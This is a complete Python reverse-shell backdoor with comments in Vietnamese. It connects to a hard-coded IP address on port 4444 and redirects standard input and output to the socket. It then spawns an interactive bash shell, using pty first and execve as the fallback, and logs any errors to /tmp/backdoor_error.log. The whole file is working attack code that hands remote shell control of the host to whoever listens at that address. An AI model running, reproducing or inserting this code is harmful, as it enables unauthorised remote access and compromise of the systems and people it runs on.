#!/usr/bin/env python3
import socket
import os
import pty
import traceback

HOST = "100.67.222.3"
PORT = 4444

def log_error(msg):
    with open("/tmp/backdoor_error.log", "a") as f:
        f.write(msg + "\n")

def connect():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        # Thử spawn bash với pty
        try:
            pty.spawn("/bin/bash")
        except Exception as e:
            # Nếu pty lỗi, fallback về execve bash
            os.execve("/bin/bash", ["/bin/bash", "-i"], os.environ)
    except Exception as e:
        log_error(f"Connection failed: {e}\n{traceback.format_exc()}")

if __name__ == "__main__":
    connect()